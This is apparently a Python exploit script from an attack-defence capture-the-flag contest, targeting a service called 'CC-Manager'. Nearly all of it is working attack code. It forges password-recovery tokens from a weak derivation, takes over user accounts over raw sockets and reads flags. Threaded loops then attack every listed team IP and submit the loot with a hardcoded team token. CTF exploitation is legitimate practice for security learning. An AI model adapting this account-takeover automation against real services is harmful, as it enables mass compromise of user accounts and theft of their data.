#/usr/bin/python3

import requests, time, re, string, random, json
from threading import Thread, Lock
from hashlib import sha256, sha1
from Crypto.Util.number import getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.number import inverse
from pwn import *

TEAM_TOKEN = "ddfe3c79ffdb518891f4f82ea90b433f"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "CC-Manager"		# NOME DELLA CHALLENGE INDICATO IN flagIds

#######################      UTILS      ######################################

def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generate_fake_flag():
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(31)) + "="
    return result_str

def get_secret_tokens(username):
	mask = (1 << 768) - 1
	p, q = getPrime(768), getPrime(768)

	user_secret = p^q
	username_int = int.from_bytes(username.encode(), byteorder = "big")
	base_value = username_int

	for _ in range(250):
		base_value = base_value * user_secret
		base_value = base_value & mask

	recovery_token_int = (base_value & ((1 << 256) - 1)) ^ username_int
	sharing_key = (base_value >> 256) ^ user_secret
	recovery_token = sha256(recovery_token_int.to_bytes(32, byteorder = "big")).hexdigest()[:16]

	return sharing_key, recovery_token

##############################################################################


lock = Lock()


class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit_with_threads(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()


def exploit(flagids):
	flag_list = []
	c = 1
	for ip in flagids[CHALLENGE_NAME]:
		size = len(flagids[CHALLENGE_NAME])
		print(f"{ip}\t-\t{c} / {size} ...")
		for hint in flagids[CHALLENGE_NAME][ip]:
			try:
				flag = get_flag(ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list


# EXPLOIT FINALE CON USO DEI THREADS
def attack_with_threads():
	global flags
	global threads
	while True:
		flags = []
		threads = []
		print("Running exploit...")

		flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
		exploit_with_threads(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)


# EXPLOIT FINALE
def attack():
	while True:
		print("Running exploit...")

		flagids = requests.get("http://10.10.0.1:8081/flagIds").json()
		flags = exploit(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(30)


			
	
def get_flag(ip, hint):
	p = remote(ip, 5000)
	logged = False
	password = ""
	username = json.loads(hint)["username"]
	
	# list_recovery_token_invalid = []
	# num_invalids = 0

	_, recovery_token = get_secret_tokens(username)

	p.recv(timeout=1)
	p.sendline(b"3")

	p.recv(timeout=1)
	p.sendline(username.encode())
	p.recv(timeout=1)
	p.sendline(recovery_token.encode())
	resp = p.recvline(timeout=1).decode()

	if "password" in resp:
		logged = True
		password = resp.split("password: ")[1]

	'''
	while not logged:
		try:
			_, recovery_token = get_secret_tokens(username)
			if recovery_token in list_recovery_token_invalid:
				num_invalids += 1
				raise Exception("Invalid")
		except Exception as e:
			# print(f"ERR: {e}")
			if num_invalids > 5:
				raise Exception("No Flag")
			continue

		# recovery token
		p.recv(timeout=1)
		p.sendline(b"3")

		p.recv(timeout=1)
		p.sendline(username.encode())
		p.recv(timeout=1)
		p.sendline(recovery_token.encode())
		resp = p.recvline(timeout=1).decode()

		if "password" in resp:
			logged = True
			password = resp.split("password: ")[1]
		else:
			num_invalids += 1
			list_recovery_token_invalid.append(recovery_token)
	'''
	
	p.recv(timeout=1)
	p.sendline(b"2")


	p.recvuntil(b"username: ", timeout=1)
	p.sendline(username.encode())
	
	p.recvuntil(b"password: ", timeout=1)
	p.sendline(password.strip().encode())

	p.recv(timeout=1)
	p.sendline("2".encode())
	resp = p.recv(timeout=1).decode()

	p.close()

	# PRELEVA FLAG E RESTITUISCILA
	flag = re.findall("[A-Z0-9]{31}=", resp)[0]
	return flag
	


## TEST get_flag
def test():
	ip = "10.60.0.1"
	hint = '{"username": "XoYPQBQSnVYth", "flag_password_name": "hLCEqDDwlS7i4VLV3pnS"}'
	flag = get_flag(ip, hint)
	print(flag)


def main():
	# test()
	# attack()
	attack_with_threads()


main()
